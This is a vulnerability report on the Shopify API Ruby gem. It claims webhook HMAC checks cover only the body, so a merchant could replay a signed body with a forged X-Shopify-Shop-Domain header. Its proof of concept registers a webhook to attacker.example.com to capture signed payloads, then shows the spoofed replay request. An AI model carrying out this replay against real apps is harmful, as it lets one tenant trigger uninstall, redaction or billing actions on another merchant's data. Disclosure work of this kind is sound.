### Title
Webhook Shop-Domain Header Is Not Covered By The HMAC Signature, Allowing Cross-Tenant Webhook Spoofing - ([File: lib/shopify_api/webhooks/request.rb])

### Summary
`ShopifyAPI::Webhooks::Request#to_signable_string` returns only the raw request body, while `ShopifyAPI::Webhooks::Request#shop` is read verbatim from the unauthenticated `X-Shopify-Shop-Domain` HTTP header. `ShopifyAPI::Utils::HmacValidator.validate` only checks the HMAC against `to_signable_string`, so the `shop` field is never covered by the signature check. `ShopifyAPI::Webhooks::Registry.process` forwards this unauthenticated `shop` value directly into `WebhookMetadata` and the app's registered handler, letting an attacker who legitimately controls the HMAC secret for one tenant impersonate webhook traffic "from" any other tenant.

### Finding Description
`Request#to_signable_string` is defined as: [1](#0-0) 
and `Request#shop` simply pulls the header value with no cross-check against the signed payload: [2](#0-1) 

`HmacValidator.validate` verifies the signature only against `verifiable_query.to_signable_string` (i.e., the body), never against the `shop`, `topic`, `webhook_id`, or `api_version` header fields: [3](#0-2) 

`Registry.process` trusts this unauthenticated `shop` value and hands it straight to the app-provided handler: [4](#0-3) [5](#0-4) 

The binding that is broken is: `shop header used by handler.handle(shop: ...)` ≠ `shop covered by HMAC(secret, to_signable_string)`. The library computes and checks `HMAC(api_secret_key, raw_body) == received_hmac`, but the resulting boolean says nothing about which shop the body belongs to — only that *some* request signed with the app's shared `api_secret_key` produced that exact body.

Because a single Shopify app's `api_secret_key` is shared across every shop that installs it, any real merchant who installs the target app (an ordinary, unprivileged action any internet user can perform on their own store) can:
1. Trigger a legitimate webhook delivery for their own shop (or, more powerfully, create their own custom webhook subscription via the Admin API pointing at an endpoint they control, using the access token issued to them for their own shop), obtaining a real `(raw_body, X-Shopify-Hmac-Sha256)` pair that is valid under the target app's `api_secret_key`.
2. Replay that exact `raw_body`/`hmac` pair to the app's shared webhook endpoint while substituting the `X-Shopify-Shop-Domain` header (and/or `webhook-id`/`topic`/`api-version` headers) with a victim shop's domain.
3. `HmacValidator.validate` still returns `true`, because it only checks the body bytes, and `Registry.process` calls the handler with `shop: <attacker-chosen victim domain>`.

### Impact Explanation
This crosses a tenant boundary: the webhook handler in the host application (built on top of this gem's documented `WebhookHandler#handle(data:)` interface) receives `data.shop` believing it to be authenticated by the HMAC check the gem just performed, when in fact only the body bytes were authenticated. Any host application logic that keys off `data.shop` — e.g., updating/deleting a session, toggling billing state, or writing tenant-scoped data for topics like `app/uninstalled`, `shop/redact`, or `customers/data_request` — can be triggered for an arbitrary victim shop by an attacker who only ever needed to install the (public) target app on their own store. This is a cross-tenant integrity/confusion issue enabled directly by this gem's `HmacValidator`/`Webhooks::Request` design, not merely a host-app oversight, since the gem presents `HmacValidator.validate` as the authenticity check and silently omits the shop identity from what it verifies.

### Likelihood Explanation
Exploitation requires only:
- Being an ordinary merchant/developer who installs the target (public) app once, which is normal, unprivileged behavior for "any internet user" in the Shopify app ecosystem.
- Ability to create a custom webhook subscription via the Admin API with a callback URL the attacker controls (a standard, documented Admin API capability once an app access token exists), to reliably obtain valid `(body, hmac)` pairs without needing to intercept traffic to the shared endpoint.
- Sending one crafted HTTP POST to the shared production webhook endpoint with the captured body/HMAC and a swapped `X-Shopify-Shop-Domain` header.

No possession of the app's `api_secret_key`, no victim credentials, and no privileged access are required — only participation as a normal tenant of the multi-tenant app, which satisfies the "unprivileged internet user" bar.

### Recommendation
Bind the shop identity (and other trust-relevant headers such as `webhook-id`/`topic`) into what is cryptographically verified, or otherwise cross-check them against out-of-band trusted state:
- Extend `Webhooks::Request#to_signable_string`-equivalent verification so the `shop-domain` header is authenticated, e.g., by requiring/validating it against the shop associated with the session/install record before invoking the handler, rather than trusting the header on its own.
- At minimum, document prominently (and ideally enforce in `Registry.process`) that `data.shop` from a webhook is not proven authentic by `HmacValidator.validate` alone, and that host applications must independently verify `data.shop` corresponds to a shop with an active, known installation before acting on it.

### Proof of Concept
```
# Preconditions: attacker has installed TargetApp on their own shop "attacker-shop.myshopify.com"
# and has an access token for it (normal legitimate install).

# 1. Attacker creates a custom webhook subscription (Admin API, using their own access token)
#    for topic "app/uninstalled" with callback address pointing to a server they control:
mutation {
  webhookSubscriptionCreate(topic: APP_UNINSTALLED, webhookSubscription: {
    callbackUrl: "https://attacker.example.com/capture",
    format: JSON
  }) { webhookSubscription { id } }
}

# 2. Shopify delivers a webhook to https://attacker.example.com/capture with headers:
#    X-Shopify-Topic: app/uninstalled
#    X-Shopify-Hmac-Sha256: <valid HMAC computed with TargetApp's api_secret_key over BODY>
#    X-Shopify-Shop-Domain: attacker-shop.myshopify.com
#    X-Shopify-Webhook-Id: ...
#    Body: BODY  (a JSON payload for app/uninstalled)

# 3. Attacker replays this exact BODY and X-Shopify-Hmac-Sha256 value directly to
#    TargetApp's real (shared, multi-tenant) webhook endpoint, but changes only the
#    X-Shopify-Shop-Domain header to the victim's shop:
POST https://targetapp.example.com/webhooks
X-Shopify-Topic: app/uninstalled
X-Shopify-Hmac-Sha256: <same valid HMAC>
X-Shopify-Shop-Domain: victim-shop.myshopify.com   # forged, attacker-chosen
X-Shopify-Webhook-Id: ...
Body: BODY   # unchanged

# ShopifyAPI::Webhooks::Registry.process:
#   Utils::HmacValidator.validate(request) => true  (only BODY is checked)
#   handler.handle(data: WebhookMetadata.new(topic: "app/uninstalled",
#                                             shop: "victim-shop.myshopify.com",  # attacker-controlled
#                                             ...))
# The host app's app/uninstalled handler now acts on "victim-shop.myshopify.com"
# even though the request was never sent by Shopify on behalf of that shop.
```

          if result || Context.old_api_secret_key.nil? || T.must(Context.old_api_secret_key).empty?

          else
            validate_signature(verifiable_query, T.must(Context.old_api_secret_key))
          end
        end

        def validate_signature(verifiable_query, secret)
          received_signature = verifiable_query.hmac
          computed_signature = compute_signature(verifiable_query.to_signable_string, secret)
          OpenSSL.secure_compare(computed_signature, T.must(received_signature))
        end
